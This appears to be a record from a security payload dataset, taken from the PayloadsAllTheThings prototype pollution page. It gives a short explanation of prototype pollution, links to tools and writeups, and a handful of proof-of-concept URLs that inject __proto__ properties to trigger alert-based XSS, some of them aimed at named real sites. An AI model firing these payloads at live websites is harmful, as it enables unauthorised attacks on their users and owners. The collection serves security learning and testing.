@@ -1,0 +1,27 @@
+{
+  "id": "xss-afa4f413dbda",
+  "category": "XSS",
+  "title": "README",
+  "description": "# Prototype Pollution\n\n> Prototype pollution is a type of vulnerability that occurs in JavaScript when properties of Object.prototype are modified. This is particularly risky because JavaScript objects are dynamic and we can add properties to them at any time. Also, almost all objects in JavaScript inherit from Object.prototype, making it a potential attack vector.\n\n## Summary\n\n* [Tools](#tools)\n* [Methodology](#methodology)\n    * [Examples](#examples)\n    * [Manual Testing](#manual-testing)\n   ",
+  "payloads": [
+    "* [yeswehack/pp-finder](https://github.com/yeswehack/pp-finder) - Help you find gadget for prototype pollution exploitation",
+    "* [yuske/silent-spring](https://github.com/yuske/silent-spring) - Prototype Pollution Leads to Remote Code Execution in Node.js",
+    "* [yuske/server-side-prototype-pollution](https://github.com/yuske/server-side-prototype-pollution) - Server-Side Prototype Pollution gadgets in Node.js core code and 3rd party NPM packages",
+    "* [BlackFan/client-side-prototype-pollution](https://github.com/BlackFan/client-side-prototype-pollution) - Prototype Pollution and useful Script Gadgets",
+    "* [portswigger/server-side-prototype-pollution](https://github.com/portswigger/server-side-prototype-pollution) - Burp Suite Extension detectiong Prototype Pollution vulnerabilities",
+    "* [msrkp/PPScan](https://github.com/msrkp/PPScan) - Client Side Prototype Pollution Scanner",
+    "https://victim.com/#a=b&__proto__[admin]=1",
+    "https://example.com/#__proto__[xxx]=alert(1)",
+    "http://server/servicedesk/customer/user/signup?__proto__.preventDefault.__proto__.handleObj.__proto__.delegateTarget=%3Cimg/src/onerror=alert(1)%3E",
+    "https://www.apple.com/shop/buy-watch/apple-watch?__proto__[src]=image&__proto__[onerror]=alert(1)",
+    "https://www.apple.com/shop/buy-watch/apple-watch?a[constructor][prototype]=image&a[constructor][prototype][onerror]=alert(1)",
+    "* Remote Command Execution: [RCE in Kibana (CVE-2019-7609)](https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/)",
+    "* Remote Command Execution: [RCE using EJS gadgets](https://mizu.re/post/ejs-server-side-prototype-pollution-gadgets-to-rce)",
+    "* Reflected XSS: [Reflected XSS on www.hackerone.com via Wistia embed code - #986386](https://hackerone.com/reports/986386)",
+    "* Client-side bypass: [Prototype pollution \u2013 and bypassing client-side HTML sanitizers](https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/)"
+  ],
+  "references": [
+    "PayloadsAllTheThings/Prototype Pollution/README.md"
+  ],
+  "source": "PayloadsAllTheThings"
+}
